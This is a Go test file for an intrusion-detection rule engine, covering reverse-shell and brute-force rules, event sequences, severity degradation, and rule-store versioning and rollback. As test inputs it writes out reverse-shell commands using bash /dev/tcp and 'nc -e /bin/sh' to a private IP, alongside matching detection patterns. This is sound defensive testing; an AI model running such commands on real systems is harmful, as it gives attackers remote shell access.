package localrules

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"
)

func tempStore(t *testing.T, rules []Rule) *Store {
	t.Helper()
	dir := t.TempDir()

	store, err := NewStore(dir, nil)
	if err != nil {
		t.Fatalf("NewStore: %v", err)
	}

	if len(rules) > 0 {
		rs := &RuleSet{Version: 1, Rules: rules}
		store.mu.Lock()
		store.current = rs
		store.version.Store(1)
		store.mu.Unlock()
	}
	return store
}

func TestEvaluateSimpleRule_Match(t *testing.T) {
	rules := []Rule{{
		ID:       "TEST-001",
		Name:     "reverse_shell",
		Severity: SeverityCritical,
		Autonomy: AutonomyAlwaysAct,
		Conditions: []Condition{
			{Field: "event_type", Op: "eq", Value: "process_exec", Weight: 1.0},
			{Field: "cmdline", Op: "contains", Value: "/dev/tcp", Weight: 5.0},
		},
		Threshold:  5.0,
		Response:   ResponseKillProcess,
		Confidence: 0.95,
	}}

	store := tempStore(t, rules)
	engine := NewEngine(store, DefaultEngineConfig())

	event := map[string]interface{}{
		"event_type": "process_exec",
		"cmdline":    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"pid":        float64(1234),
		"binary":     "/bin/bash",
	}

	detections := engine.Evaluate(event)
	if len(detections) != 1 {
		t.Fatalf("expected 1 detection, got %d", len(detections))
	}

	d := detections[0]
	if d.Rule.ID != "TEST-001" {
		t.Errorf("expected rule TEST-001, got %s", d.Rule.ID)
	}
	if d.Score < 5.0 {
		t.Errorf("expected score >= 5.0, got %f", d.Score)
	}
}

func TestEvaluateSimpleRule_NoMatch(t *testing.T) {
	rules := []Rule{{
		ID:       "TEST-002",
		Name:     "reverse_shell",
		Severity: SeverityCritical,
		Autonomy: AutonomyAlwaysAct,
		Conditions: []Condition{
			{Field: "event_type", Op: "eq", Value: "process_exec", Weight: 1.0},
			{Field: "cmdline", Op: "contains", Value: "/dev/tcp", Weight: 5.0},
		},
		Threshold:  5.0,
		Response:   ResponseKillProcess,
		Confidence: 0.95,
	}}

	store := tempStore(t, rules)
	engine := NewEngine(store, DefaultEngineConfig())

	event := map[string]interface{}{
		"event_type": "process_exec",
		"cmdline":    "ls -la /tmp",
		"pid":        float64(1234),
		"binary":     "/bin/ls",
	}

	detections := engine.Evaluate(event)
	if len(detections) != 0 {
		t.Fatalf("expected 0 detections, got %d", len(detections))
	}
}

func TestEvaluateRegexRule(t *testing.T) {
	rules := []Rule{{
		ID:       "TEST-003",
		Name:     "regex_test",
		Severity: SeverityHigh,
		Autonomy: AutonomyAlwaysAct,
		Conditions: []Condition{
			{Field: "event_type", Op: "eq", Value: "process_exec", Weight: 1.0},
			{Field: "cmdline", Op: "regex", Value: `nc.*-e|ncat.*--exec`, Weight: 5.0},
		},
		Threshold: 5.0,
		Response:  ResponseKillProcess,
	}}

	store := tempStore(t, rules)
	engine := NewEngine(store, DefaultEngineConfig())

	event := map[string]interface{}{
		"event_type": "process_exec",
		"cmdline":    "nc -e /bin/sh 10.0.0.1 4444",
		"pid":        float64(999),
	}

	detections := engine.Evaluate(event)
	if len(detections) != 1 {
		t.Fatalf("expected 1 detection for regex match, got %d", len(detections))
	}
}

func TestEvaluateNotInBaseline(t *testing.T) {
	rules := []Rule{{
		ID:       "TEST-004",
		Name:     "unknown_process",
		Severity: SeverityMedium,
		Autonomy: AutonomyAlwaysAct,
		Conditions: []Condition{
			{Field: "event_type", Op: "eq", Value: "process_exec", Weight: 1.0},
			{Field: "binary", Op: "not_in", Value: map[string]interface{}{"ref": "baseline_apps"}, Weight: 4.0},
		},
		Threshold: 4.0,
		Response:  ResponseLog,
	}}

	store := tempStore(t, rules)
	engine := NewEngine(store, DefaultEngineConfig())
	engine.SetProfileRefs(map[string][]string{
		"baseline_apps": {"/usr/sbin/nginx", "/usr/bin/postgres", "/usr/sbin/cron"},
	})

	// Unknown binary → should fire.
	event := map[string]interface{}{
		"event_type": "process_exec",
		"binary":     "/tmp/cryptominer",
	}
	detections := engine.Evaluate(event)
	if len(detections) != 1 {
		t.Fatalf("expected 1 detection for unknown binary, got %d", len(detections))
	}

	// Known binary → should not fire.
	event2 := map[string]interface{}{
		"event_type": "process_exec",
		"binary":     "/usr/sbin/nginx",
	}
	detections2 := engine.Evaluate(event2)
	if len(detections2) != 0 {
		t.Fatalf("expected 0 detections for baseline binary, got %d", len(detections2))
	}
}

func TestCorrelationRule(t *testing.T) {
	rules := []Rule{{
		ID:       "TEST-005",
		Name:     "brute_force",
		Severity: SeverityHigh,
		Autonomy: AutonomyAlwaysAct,
		Correlation: &CorrelationSpec{
			EventType:      "auth_failure",
			GroupBy:        "src_ip",
			CountThreshold: 3,
			TimeframeSec:   60,
		},
		Threshold: 1.0,
		Response:  ResponseBlockIP,
	}}

	store := tempStore(t, rules)
	engine := NewEngine(store, DefaultEngineConfig())

	event := map[string]interface{}{
		"event_type": "auth_failure",
		"src_ip":     "192.168.1.100",
	}

	// First 2 events: no detection.
	for i := 0; i < 2; i++ {
		d := engine.Evaluate(event)
		if len(d) != 0 {
			t.Fatalf("event %d: expected 0 detections, got %d", i, len(d))
		}
	}

	// 3rd event: threshold reached.
	d := engine.Evaluate(event)
	if len(d) != 1 {
		t.Fatalf("expected 1 detection at threshold, got %d", len(d))
	}
	if d[0].GroupKey != "192.168.1.100" {
		t.Errorf("expected group key 192.168.1.100, got %s", d[0].GroupKey)
	}
}

func TestSequenceRule(t *testing.T) {
	rules := []Rule{{
		ID:       "TEST-006",
		Name:     "priv_escalation",
		Severity: SeverityCritical,
		Autonomy: AutonomyAlwaysAct,
		Sequence: &SequenceSpec{
			TimeframeSec: 300,
			Steps: []SequenceStep{
				{EventType: "auth_failure", FieldMatch: map[string]interface{}{"service": "sudo"}},
				{EventType: "process_exec", FieldMatch: map[string]interface{}{"binary": "/usr/bin/sudo"}},
				{EventType: "file_access", FieldMatch: map[string]interface{}{"path": "/etc/shadow"}},
			},
			GroupBy: "uid",
		},
		Threshold: 1.0,
		Response:  ResponseKillProcess,
	}}

	store := tempStore(t, rules)
	engine := NewEngine(store, DefaultEngineConfig())

	// Step 1.
	d := engine.Evaluate(map[string]interface{}{
		"event_type": "auth_failure", "service": "sudo", "uid": "1000",
	})
	if len(d) != 0 {
		t.Fatalf("step 1: expected 0 detections")
	}

	// Step 2.
	d = engine.Evaluate(map[string]interface{}{
		"event_type": "process_exec", "binary": "/usr/bin/sudo", "uid": "1000",
	})
	if len(d) != 0 {
		t.Fatalf("step 2: expected 0 detections")
	}

	// Step 3: sequence complete.
	d = engine.Evaluate(map[string]interface{}{
		"event_type": "file_access", "path": "/etc/shadow", "uid": "1000",
	})
	if len(d) != 1 {
		t.Fatalf("step 3: expected 1 detection, got %d", len(d))
	}
}

func TestDegradationLevels(t *testing.T) {
	rules := []Rule{
		{ID: "C1", Severity: SeverityCritical, Conditions: []Condition{{Field: "x", Op: "eq", Value: "1", Weight: 1}}, Threshold: 1},
		{ID: "H1", Severity: SeverityHigh, Conditions: []Condition{{Field: "x", Op: "eq", Value: "1", Weight: 1}}, Threshold: 1},
		{ID: "M1", Severity: SeverityMedium, Conditions: []Condition{{Field: "x", Op: "eq", Value: "1", Weight: 1}}, Threshold: 1},
		{ID: "L1", Severity: SeverityLow, Conditions: []Condition{{Field: "x", Op: "eq", Value: "1", Weight: 1}}, Threshold: 1},
	}

	store := tempStore(t, rules)
	engine := NewEngine(store, DefaultEngineConfig())
	event := map[string]interface{}{"x": "1"}

	// Level 0: all fire.
	engine.SetDegradeLevel(0)
	if len(engine.Evaluate(event)) != 4 {
		t.Error("level 0: expected 4 detections")
	}

	// Level 1: no low.
	engine.SetDegradeLevel(1)
	d := engine.Evaluate(event)
	if len(d) != 3 {
		t.Errorf("level 1: expected 3 detections, got %d", len(d))
	}

	// Level 4: critical only.
	engine.SetDegradeLevel(4)
	d = engine.Evaluate(event)
	if len(d) != 1 {
		t.Errorf("level 4: expected 1 detection, got %d", len(d))
	}
	if d[0].Rule.ID != "C1" {
		t.Errorf("level 4: expected C1, got %s", d[0].Rule.ID)
	}
}

func TestStoreVersionMonotonic(t *testing.T) {
	dir := t.TempDir()
	store, err := NewStore(dir, nil)
	if err != nil {
		t.Fatal(err)
	}

	rs1 := `{"version": 5, "rules": [{"id": "R1", "name": "test", "severity": "low", "threshold": 1}]}`
	if err := store.Update([]byte(rs1)); err != nil {
		t.Fatal(err)
	}

	// Same version should fail.
	rs2 := `{"version": 5, "rules": [{"id": "R2", "name": "test2", "severity": "low", "threshold": 1}]}`
	if err := store.Update([]byte(rs2)); err == nil {
		t.Error("expected monotonic violation error")
	}

	// Lower version should fail.
	rs3 := `{"version": 3, "rules": []}`
	if err := store.Update([]byte(rs3)); err == nil {
		t.Error("expected monotonic violation error")
	}

	// Higher version should succeed.
	rs4 := `{"version": 10, "rules": [{"id": "R3", "name": "test3", "severity": "high", "threshold": 1}]}`
	if err := store.Update([]byte(rs4)); err != nil {
		t.Fatalf("version 10 should succeed: %v", err)
	}

	if store.Version() != 10 {
		t.Errorf("expected version 10, got %d", store.Version())
	}
}

func TestStoreRollback(t *testing.T) {
	dir := t.TempDir()
	store, err := NewStore(dir, nil)
	if err != nil {
		t.Fatal(err)
	}

	rs1 := `{"version": 1, "rules": [{"id": "R1", "name": "first", "severity": "low", "threshold": 1}]}`
	_ = store.Update([]byte(rs1))

	rs2 := `{"version": 2, "rules": [{"id": "R2", "name": "second", "severity": "high", "threshold": 1}]}`
	_ = store.Update([]byte(rs2))

	if store.Version() != 2 {
		t.Fatalf("expected version 2, got %d", store.Version())
	}

	if err := store.Rollback(); err != nil {
		t.Fatal(err)
	}

	if store.Version() != 1 {
		t.Errorf("expected version 1 after rollback, got %d", store.Version())
	}

	current := store.Current()
	if len(current.Rules) != 1 || current.Rules[0].ID != "R1" {
		t.Error("expected rule R1 after rollback")
	}
}

func TestStoreRollbackNoPrevious(t *testing.T) {
	dir := t.TempDir()
	store, _ := NewStore(dir, nil)

	rs1 := `{"version": 1, "rules": []}`
	_ = store.Update([]byte(rs1))

	if err := store.Rollback(); err == nil {
		t.Error("expected error when no previous version available")
	}
}

func TestStorePersistence(t *testing.T) {
	dir := t.TempDir()

	// Create and update store.
	store1, _ := NewStore(dir, nil)
	rs := `{"version": 7, "rules": [{"id": "P1", "name": "persist", "severity": "critical", "threshold": 1}]}`
	_ = store1.Update([]byte(rs))

	// Reopen store — should load from disk.
	store2, err := NewStore(dir, nil)
	if err != nil {
		t.Fatal(err)
	}
	if store2.Version() != 7 {
		t.Errorf("expected persisted version 7, got %d", store2.Version())
	}
	current := store2.Current()
	if current == nil || len(current.Rules) != 1 || current.Rules[0].ID != "P1" {
		t.Error("expected persisted rule P1")
	}
}

func TestCorrelatorCleanup(t *testing.T) {
	c := NewCorrelator(100, 1000)

	// Add a counter that will expire.
	c.IncrementCounter("rule1", "group1", 10, 1)
	time.Sleep(3 * time.Second)
	c.Cleanup()

	c.mu.Lock()
	_, exists := c.counters["rule1:group1"]
	c.mu.Unlock()

	if exists {
		t.Error("expected counter to be cleaned up after window expiry")
	}
}

func TestIsActionAllowed(t *testing.T) {
	tests := []struct {
		policy   string
		severity string
		want     bool
	}{
		{AutonomyAlwaysAct, SeverityLow, true},
		{AutonomyAlwaysAct, SeverityCritical, true},
		{AutonomyCriticalHigh, SeverityCritical, true},
		{AutonomyCriticalHigh, SeverityHigh, true},
		{AutonomyCriticalHigh, SeverityMedium, false},
		{AutonomyCriticalOnly, SeverityCritical, true},
		{AutonomyCriticalOnly, SeverityHigh, false},
		{AutonomyLogOnly, SeverityCritical, false},
	}

	for _, tt := range tests {
		got := IsActionAllowed(tt.policy, tt.severity)
		if got != tt.want {
			t.Errorf("IsActionAllowed(%q, %q) = %v, want %v", tt.policy, tt.severity, got, tt.want)
		}
	}
}

func TestEngineMaxRulesRespected(t *testing.T) {
	// Create 100 rules but limit to 5.
	rules := make([]Rule, 100)
	for i := range rules {
		sev := SeverityLow
		if i < 2 {
			sev = SeverityCritical
		}
		rules[i] = Rule{
			ID:       fmt.Sprintf("R%d", i),
			Severity: sev,
			Conditions: []Condition{
				{Field: "x", Op: "eq", Value: "1", Weight: 1},
			},
			Threshold: 1,
		}
	}

	store := tempStore(t, rules)
	cfg := DefaultEngineConfig()
	cfg.MaxRules = 5
	engine := NewEngine(store, cfg)

	// Should only have 5 compiled rules, prioritized by severity.
	if len(engine.compiled) != 5 {
		t.Errorf("expected 5 compiled rules, got %d", len(engine.compiled))
	}

	// First 2 should be critical.
	for i := 0; i < 2; i++ {
		if engine.compiled[i].Severity != SeverityCritical {
			t.Errorf("rule %d: expected critical, got %s", i, engine.compiled[i].Severity)
		}
	}
}

func init() {
	_ = filepath.Join
	_ = os.MkdirAll
	_ = fmt.Sprintf
}
